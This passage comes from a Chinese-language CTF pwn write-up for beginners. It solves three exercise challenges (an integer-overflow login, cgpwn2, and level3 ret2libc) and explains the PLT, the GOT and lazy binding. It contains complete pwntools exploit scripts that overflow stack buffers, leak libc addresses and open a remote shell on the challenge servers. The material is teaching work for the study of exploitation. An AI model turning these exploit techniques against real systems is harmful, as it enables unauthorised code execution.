    from pwn import *
    io = remote("111.198.29.45", 48764)
    io.sendlineafter('Your choice:','1')
    io.sendlineafter('username:','aa')
    payload = "A"*24 + p32(0x804868b) +'A'*(259-28)
    io.sendlineafter('passwd:',payload)
    io.interactive()
你懒得计算也可以利用python一些右对齐函数比如
    payload = "a"*24 + p32(0x804868b)
    payload = payload.ljust(259,"A")
    这样就会让payload刚好259长度，然后A在右边填充。
    256 -> 0
    257 -> 1
    ...
    259 -> 3
###  0x2.5 cgpwn2
####  (1) 题目描述及其考点
菜鸡认为自己需要一个字符串
考点: 栈溢出题目_变形
#### (2) wp
日常checksec
没有栈溢出保护,上ida
乍看的时候我感觉好像涉及到比较复杂的计算，这个时候我建议直接从后面开始回溯读取，让时间最小化。
结果发现我们只要重点关注最后两行输入就行了。
很明显这里用了gets所以我们可以直接retlibc hello函数
我们查看下有没有system函数,ida查看导入函数表
然后我们还需要找/bin/sh
这里浅浅分析下为什么要找/bin/sh，
1.因为内存地址是动态的，我们没办法知道我们写入的字符串地址
2.我们可以借助一些存放在bss段等可知的内存空间变量
不理解可以查阅相关资料
keyword: 程序是如何加载进内存的
或者后面我会分析一波。
这个题目我们可以利用
fgets(name, 50, stdin);伪造name为一个/bin/sh字符串
我们查看下name的位置,
bingo！ 是在bss段(未初始化的变量),所以我们可以写入一个字符串了
这里注意下c语言字符串末尾必须得带上\x00
所以这里就是简单计算的问题了，刚好考验下刚才level2操作，这里我就不赘述了，直接exp
    from pwn import *
    io = remote('111.198.29.45', 51465)
    sh_addr = 0x0804A080
    io.sendlineafter('name','/bin/sh\x00')
    io.sendlineafter('here:','a'*42 + p32(0x08048420) + p32(0xdeadbeef) + p32(sh_addr))
    io.interactive()
###  0x2.5 level3
####  (1) 题目描述及其考点
libc!libc!这次没有system，你能帮菜鸡解决这个难题么?
考点: 栈溢出_加强版ROP利用lib.so函数
####  (2) wp
日常checksec
然后上ida
非常简洁的一个read函数溢出，但是这里没有system和/bin/sh
我们可以看到libc_32.so.6是开了地址随机化的，也就是说里面的函数地址是变化，但是不同函数直接的相对偏移地址是不变的(libc.so文件中各个函数的相对位置和加载到内存中之后各个函数的相对位置相同)
换句话说就是这样:
假设 A在 libc32.so.6中当前的地址是 0x1 B在 libc32.so.6 是0x3 (这个我们可以ida或者readelf查看得到)
当程序进行加载 libc_32.so.6的时候，地址会随机化
假设A 变成了 0x2 那么我们就可以通过计算 0x2 + (0x3-0x1) = 0x4 得到b的地址
那么我们下面就进行具体的操作吧
pwntools的一些基础操作介绍:https://www.cnblogs.com/Ox9A82/p/5728149.html
如果不明白pwntools的指令可以先前去学习一下
首先程序加载的时候会有个映射，这就涉及到plt和got表,其中got表存放的就是函数绝对地址
(关于plt+got动态绑定的知识，后面我会重新细讲一波)。
可以先掌握一些概念
GOT(Global Offset Table): 全局偏移表
PLT(Procedure Link Table): 程序链接表
call printf@plt 就是先去plt表的printf 然后再jmp *printf@got 跳到got表找到真实的printf地址
延迟绑定: 程序在使用外部函数库的时候并不会将所有函数进行链接，而是在使用的时候再重新链接
实现延迟绑定:
jmp “地址”
push “ printf引用在重定位表的“.rel.plt”中的下标”；
jump dlruntime_resolve//这个函数是完成符号解析和重定位的；
_dl_runtime_resolve_avx：找到调用它的函数的真实地址，并将它填入到该函数对应的GOT中
可以提前学习一波这个文章。
[计算机原理系列之八 ——– 可执行文件的PLT和GOT](https://luomuxiaoxiao.com/?p=578#221)
程序在执行第一次write函数的时候会调用_dl_runtime_resolve_avx,got表就会建立起来，第二次调用时
就会直接加载got表对应的就是加载lib_32.so.6内存地址值。
先简单说下这个题目的思路:
1.我们利用read函数溢出覆盖ebp,ebp+4
存放的是write函数参数(write的got表地址)，下面依次是write函数的返回地址(vulnerable_function) 在到write函数地址
2.程序执行完write函数之后会输出got表的中write函数的地址，然后ret再一次跳到vulnerable_function这个函数上面，我们在进行溢出执行偏移后的system地址，完成调用
这里借用一个大神博客的图:
我们先获取偏移量:
    readelf -a ./libc_32.so.6 |grep " write@"
    > 2323: 000d43c0   101 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.0
    readelf -a ./libc_32.so.6 |grep " system@"
    > 1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
    readelf -a ./libc_32.so.6 |
    >strings -a -t x ./libc_32.so.6 | grep "/bin/sh"
    > 15902b /bin/sh
1.首先获取write地址代码
    io = process('./level3')
    elf = ELF('./level3')
    libc=ELF('libc_32.so.6')
    write_addr = elf.symbols['write']
    vul_addr= elf.symbols['vulnerable_function']
    got_addr= elf.got['write']
    # write函数有4个参数write(1(代表向输出流写入),字符串地址值,输出长度) 压栈的时候是先从右边开始
    #但是我们写payload的时候是从左边开始压的要记住，pwntools会自己转换的。
    payload1="a"*140+p32(write_addr)+p32(vul_addr)+p32(1)+p32(got_addr)+p32(4)
    io.recvuntil("Input:\n")
    io.sendline(payload1)
    write_addr=hex(u32(io.recv(4)))
    print(write_addr)
这里我们调用pwntool来直接计算偏移：
    libc_write=libc.symbols['write']
    libc_system=libc.symbols['system']
    libc_sh=libc.search('/bin/sh').next()
    print(hex(libc_write))
    print(hex(libc_system))
    print(hex(libc_sh))
可以看到和我们上面的结果是一致的
然后我们计算偏移公式很简单a’+ b-a就是b’的距离
直接上exp.py
    from pwn import *
    # io = process('./level3')
    io = remote('111.198.29.45', 51844)
    elf = ELF('./level3')
    libc=ELF('libc_32.so.6')
    write_addr = elf.symbols['write']
    vul_addr= elf.symbols['vulnerable_function']
    got_addr= elf.got['write']
    payload1="a"*140+p32(write_addr)+p32(vul_addr)+p32(1)+p32(got_addr)+p32(4)
    io.recvuntil("Input:\n")
    io.sendline(payload1)
    write_addr=u32(io.recv(4))
    print(hex(write_addr))
    libc_write=libc.symbols['write']
    libc_system=libc.symbols['system']
    libc_sh=libc.search('/bin/sh').next()
    print(hex(libc_write))
    print(hex(libc_system))
    print(hex(libc_sh))
    system_addr=write_addr + libc_system - libc_write
    sh_addr=write_addr + libc_sh -libc_write
    payload2='a'*140+p32(system_addr)+"aaaa"+p32(sh_addr)
    io.sendline(payload2)
    io.interactive()
####  (3) 题目小结
这个题目可以说是基础ROP的入门，通过控制返回地址进行多重跳，很有进阶的意义。
####  (4) 参考文章
[计算机原理系列之八 ——– 可执行文件的PLT和GOT](https://luomuxiaoxiao.com/?p=578#221)
[Writeup of level3(Pwn) in
JarvisOJ](https://blog.csdn.net/cossack9989/article/details/79326659)
[聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT](https://blog.csdn.net/linyt/article/details/51635768)
## 0x3 总结
这次这几个题目做了2.3天，感觉收获还是挺大的，其中很感谢一些师傅回答我比较傻的问题，一语惊醒梦中人，期间我也看了网上很多wp，基本都是雷同或者草草了事的，很少有那种新手摸索的过程，因为本人是个菜鸡，难免会有疏漏，希望各位师傅多多包容，然后指出，让我更加深pwn的理解，谢谢。
## 0x4参考链接
[ROP学习：64位栈溢出](/chybeta.github.io/2017/06/26/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/\))
[linux-pwn基础1](/yaov.net/2018/09/15/linux-pwn%E5%9F%BA%E7%A1%801/\))
[Ret2libc详解](https://zhouyetao.yzzaccept.top/index.php/2019/06/16/ret2libc.html)
[Linux gdb调试器用法全面解析](https://blog.csdn.net/21cnbao/article/details/7385161)
[攻防世界pwn之新手练习区](https://www.cnblogs.com/at0de/p/11269120.html)